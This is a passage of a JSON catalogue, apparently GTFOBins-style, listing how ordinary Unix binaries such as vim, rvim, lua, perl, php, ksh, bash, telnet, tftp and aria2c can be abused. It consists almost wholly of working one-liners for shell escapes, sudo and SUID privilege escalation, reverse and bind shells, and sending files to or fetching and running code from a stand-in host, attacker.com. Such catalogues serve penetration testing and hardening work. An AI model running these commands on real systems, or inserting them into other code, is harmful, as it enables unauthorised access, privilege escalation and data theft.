request.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'\n"}, {"description": "Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n"}], "file-write": [{"code": "export LFILE=file_to_write\nbash -c 'echo DATA > $LFILE'\n"}, {"description": "This adds timestamps to the output file.", "code": "LFILE=file_to_write\nHISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w $LFILE\n"}], "file-read": [{"description": "It trims trailing newlines and it's not binary-safe.", "code": "export LFILE=file_to_read\nbash -c 'echo \"$(<$LFILE)\"'\n"}, {"description": "The read file content is surrounded by the current history content.", "code": "LFILE=file_to_read\nHISTTIMEFORMAT=$'\\r\\e[K'\nhistory -r $LFILE\nhistory\n"}], "library-load": [{"code": "bash -c 'enable -f ./lib.so x'"}], "suid": [{"code": "./bash -p"}], "sudo": [{"code": "sudo bash"}]}, "zip": {"shell": [{"code": "TF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF\n"}], "sudo": [{"code": "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"}], "limited-suid": [{"code": "TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"}]}, "emacs": {"shell": [{"code": "emacs -Q -nw --eval '(term \"/bin/sh\")'"}], "file-write": [{"code": "emacs file_to_write\nDATA\nC-x C-s\n"}], "file-read": [{"code": "emacs file_to_read"}], "suid": [{"code": "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"}], "sudo": [{"code": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"}]}, "soelim": {"file-read": [{"code": "LFILE=file_to_read\nsoelim \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./soelim \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n"}]}, "zsh": {"shell": [{"code": "zsh"}], "suid": [{"code": "./zsh"}], "sudo": [{"code": "sudo zsh"}]}, "flock": {"shell": [{"code": "flock -u / /bin/sh"}], "suid": [{"code": "./flock -u / /bin/sh -p"}], "sudo": [{"code": "sudo flock -u / /bin/sh"}]}, "watch": {"shell": [{"code": "watch -x sh -c 'reset; exec sh 1>&0 2>&0'"}], "suid": [{"description": "This keeps the SUID privileges only if the `-x` option is present.", "code": "./watch -x sh -c 'reset; exec sh 1>&0 2>&0'"}], "sudo": [{"code": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"}], "limited-suid": [{"code": "./watch 'reset; exec sh 1>&0 2>&0'"}]}, "ionice": {"shell": [{"code": "ionice /bin/sh"}], "suid": [{"code": "./ionice /bin/sh -p"}], "sudo": [{"code": "sudo ionice /bin/sh"}]}, "pico": {"shell": [{"code": "pico\n^R^X\nreset; sh 1>&0 2>&0\n"}, {"description": "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.", "code": "pico -s /bin/sh\n/bin/sh\n^T\n"}], "file-write": [{"code": "pico file_to_write\nDATA\n^O\n"}], "file-read": [{"code": "pico file_to_read"}], "suid": [{"description": "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.", "code": "./pico\n^R^X\nreset; sh 1>&0 2>&0\n"}], "sudo": [{"code": "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n"}]}, "grep": {"file-read": [{"code": "LFILE=file_to_read\ngrep '' $LFILE\n"}], "suid": [{"code": "LFILE=file_to_read\n./grep '' $LFILE\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo grep '' $LFILE\n"}]}, "tftp": {"file-upload": [{"description": "Send local file to a TFTP server.", "code": "RHOST=attacker.com\ntftp $RHOST\nput file_to_send\n"}], "file-download": [{"description": "Fetch a remote file from a TFTP server.", "code": "RHOST=attacker.com\ntftp $RHOST\nget file_to_get\n"}], "suid": [{"description": "Send local file to a TFTP server.", "code": "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n"}], "sudo": [{"description": "Send local file to a TFTP server.", "code": "RHOST=attacker.com\nsudo -E tftp $RHOST\nput file_to_send\n"}]}, "rvim": {"shell": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that `rvim` is compiled with Lua support.", "code": "rvim -c ':lua os.execute(\"reset; exec sh\")'"}], "reverse-shell": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n"}], "non-interactive-reverse-shell": [{"description": "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"}], "non-interactive-bind-shell": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"}], "file-upload": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n"}, {"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n"}, {"description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"}], "file-download": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n"}, {"description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nexport LFILE=file_to_save\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"}], "file-write": [{"code": "rvim file_to_write\niDATA\n^[\nw\n"}], "file-read": [{"code": "rvim file_to_read"}], "library-load": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"}], "suid": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"}], "sudo": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that `rvim` is compiled with Lua support.", "code": "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'"}], "capabilities": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}], "limited-suid": [{"description": "This requires that `rvim` is compiled with Lua support.", "code": "./rvim -c ':lua os.execute(\"reset; exec sh\")'"}]}, "lua": {"shell": [{"code": "lua -e 'os.execute(\"/bin/sh\")'"}], "non-interactive-reverse-shell": [{"description": "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nlua -e 'local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"}], "non-interactive-bind-shell": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed.", "code": "export LPORT=12345\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"}], "file-upload": [{"description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires `lua-socket` installed.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nlua -e '\n  local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"}], "file-download": [{"description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires `lua-socket` installed.", "code": "export LPORT=12345\nexport LFILE=file_to_save\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"}], "file-write": [{"code": "lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"DATA\"); io.close(f);'"}], "file-read": [{"code": "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"}], "sudo": [{"code": "sudo lua -e 'os.execute(\"/bin/sh\")'"}], "limited-suid": [{"code": "./lua -e 'os.execute(\"/bin/sh\")'"}]}, "perl": {"shell": [{"code": "perl -e 'exec \"/bin/sh\";'"}], "reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nperl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n"}], "suid": [{"code": "./perl -e 'exec \"/bin/sh\";'"}], "sudo": [{"code": "sudo perl -e 'exec \"/bin/sh\";'"}], "capabilities": [{"code": "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"}]}, "arp": {"file-read": [{"code": "LFILE=file_to_read\narp -v -f \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./arp -v -f \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n"}]}, "diff": {"file-read": [{"code": "LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE\n"}], "suid": [{"code": "LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n"}]}, "nl": {"file-read": [{"code": "LFILE=file_to_read\nnl -bn -w1 -s '' $LFILE\n"}], "suid": [{"code": "LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n"}]}, "more": {"shell": [{"code": "TERM= more /etc/profile\n!/bin/sh\n"}], "file-read": [{"code": "more file_to_read"}], "suid": [{"code": "./more file_to_read"}], "sudo": [{"code": "TERM= sudo -E more /etc/profile\n!/bin/sh\n"}]}, "cpulimit": {"shell": [{"code": "cpulimit -l 100 -f /bin/sh"}], "sudo": [{"code": "sudo cpulimit -l 100 -f /bin/sh"}]}, "script": {"shell": [{"code": "script -q /dev/null"}], "sudo": [{"code": "sudo script -q /dev/null"}], "file-write": [{"description": "The wrote content is corrupted by debug prints.", "code": "script -q -c 'echo DATA' file_to_write"}]}, "aria2c": {"command": [{"code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x\n"}, {"description": "The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.", "code": "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa"}], "suid": [{"code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x\n"}], "sudo": [{"code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"}]}, "time": {"shell": [{"code": "/usr/bin/time /bin/sh"}], "suid": [{"code": "./time /bin/sh -p"}], "sudo": [{"code": "sudo /usr/bin/time /bin/sh"}]}, "telnet": {"shell": [{"description": "BSD version only. Needs to be connected first.", "code": "RHOST=attacker.com\nRPORT=12345\ntelnet $RHOST $RPORT\n^]\n!/bin/sh\n"}], "reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "RHOST=attacker.com\nRPORT=12345\nTF=$(mktemp -u)\nmkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF\n"}], "sudo": [{"description": "BSD version only. Needs to be connected first.", "code": "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n"}], "limited-suid": [{"description": "BSD version only. Needs to be connected first.", "code": "RHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh\n"}]}, "fold": {"file-read": [{"code": "LFILE=file_to_read\nfold -w99999999 \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./fold -w99999999 \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n"}]}, "unshare": {"shell": [{"code": "unshare /bin/sh"}], "suid": [{"code": "./unshare -r /bin/sh"}], "sudo": [{"code": "sudo unshare /bin/sh"}]}, "service": {"shell": [{"code": "/usr/sbin/service ../../bin/sh"}], "sudo": [{"code": "sudo service ../../bin/sh"}]}, "vim": {"shell": [{"code": "vim -c ':!/bin/sh'"}, {"code": "vim\n:set shell=/bin/sh\n:shell\n"}, {"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that `vim` is compiled with Lua support.", "code": "vim -c ':lua os.execute(\"reset; exec sh\")'"}], "reverse-shell": [{"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n"}], "non-interactive-reverse-shell": [{"description": "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"}], "non-interactive-bind-shell": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"}], "file-upload": [{"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n"}, {"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n"}, {"description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"}], "file-download": [{"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n"}, {"description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nexport LFILE=file_to_save\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"}], "file-write": [{"code": "vim file_to_write\niDATA\n^[\nw\n"}], "file-read": [{"code": "vim file_to_read"}], "library-load": [{"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"}], "suid": [{"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"}], "sudo": [{"code": "sudo vim -c ':!/bin/sh'"}, {"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that `vim` is compiled with Lua support.", "code": "sudo vim -c ':lua os.execute(\"reset; exec sh\")'"}], "capabilities": [{"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}], "limited-suid": [{"description": "This requires that `vim` is compiled with Lua support.", "code": "./vim -c ':lua os.execute(\"reset; exec sh\")'"}]}, "dmesg": {"file-read": [{"description": "This is not suitable for binary files.", "code": "LFILE=file_to_read\ndmesg -rF \"$LFILE\"\n"}], "shell": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "dmesg -H\n!/bin/sh\n"}], "sudo": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo dmesg -H\n!/bin/sh\n"}]}, "timeout": {"shell": [{"code": "timeout 7d /bin/sh"}], "suid": [{"code": "./timeout 7d /bin/sh -p"}], "sudo": [{"code": "sudo timeout --foreground 7d /bin/sh"}]}, "php": {"shell": [{"code": "export CMD=\"/bin/sh\"\nphp -r 'system(getenv(\"CMD\"));'\n"}, {"code": "export CMD=\"/bin/sh\"\nphp -r 'passthru(getenv(\"CMD\"));'\n"}, {"code": "export CMD=\"/bin/sh\"\nphp -r 'print(shell_exec(getenv(\"CMD\")));'\n"}, {"code": "export CMD=\"/bin/sh\"\nphp -r '$r=array(); exec(getenv(\"CMD\"), $r); print(join(\"\\\\n\",$r));'\n"}, {"code": "export CMD=\"/bin/sh\"\nphp -r '$h=@popen(getenv(\"CMD\"),\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'\n"}], "command": [{"code": "export CMD=\"id\"\nphp -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(getenv(\"CMD\"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'\n"}], "reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nphp -r '$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"}], "file-upload": [{"description": "Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.", "code": "LHOST=0.0.0.0\nLPORT=8888\nphp -S $LHOST:$LPORT\n"}], "file-download": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nphp -r '$c=file_get_contents(getenv(\"URL\"));file_put_contents(getenv(\"LFILE\"), $c);'\n"}], "suid": [{"code": "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"}], "sudo": [{"code": "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"}], "capabilities": [{"code": "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"}]}, "fmt": {"file-read": [{"description": "This only works for the GNU version of `fmt`.", "code": "LFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX \"$LFILE\"\n"}, {"description": "This corrupts the output by wrapping very long lines at the given width.", "code": "LFILE=file_to_read\nfmt -999 \"$LFILE\"\n"}], "suid": [{"description": "This corrupts the output by wrapping very long lines at the given width.", "code": "LFILE=file_to_read\n./fmt -999 \"$LFILE\"\n"}], "sudo": [{"description": "This corrupts the output by wrapping very long lines at the given width.", "code": "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n"}]}, "tmux": {"shell": [{"code": "tmux"}], "sudo": [{"code": "sudo tmux"}]}, "unexpand": {"file-read": [{"code": "LFILE=file_to_read\nunexpand -t99999999 \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n"}]}, "rpm": {"shell": [{"code": "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"}], "suid": [{"code": "./rpm --eval '%{lua:os.execute(\"/bin/sh\", \"-p\")}'"}], "sudo": [{"code": "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"}, {"description": "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n", "code": "sudo rpm -ivh x-1.0-1.noarch.rpm\n"}]}, "nroff": {"shell": [{"code": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nGROFF_BIN_PATH=$TF nroff\n"}], "sudo": [{"code": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo -E GROFF_BIN_PATH=$TF nroff\n"}]}, "ksh": {"shell": [{"code": "ksh"}], "reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'\n"}], "file-upload": [{"description": "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'echo -e \"POST / HTTP/0.9\\n\\n$(cat $LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n"}, {"description": "Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n"}], "file-download": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'\n"}, {"description": "Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n"}], "file-write": [{"code": "export LFILE=file_to_write\nksh -c 'echo DATA > $LFILE'\n"}], "file-read": [{"description": "It trims trailing newlines.", "code": "export LFILE=file_to_read\nksh -c 'echo \"$(<$LFILE)\"'\n"}, {"description": "It trims trailing newlines.", "code": "export LFILE=file_to_read\nksh -c $'read -r -d \\x04 < \"$LFILE\"; echo \"$REPLY\"'\n"}], "suid": [{"code": "./ksh -p"}], "sudo": [{"code": "sudo ksh"}]}}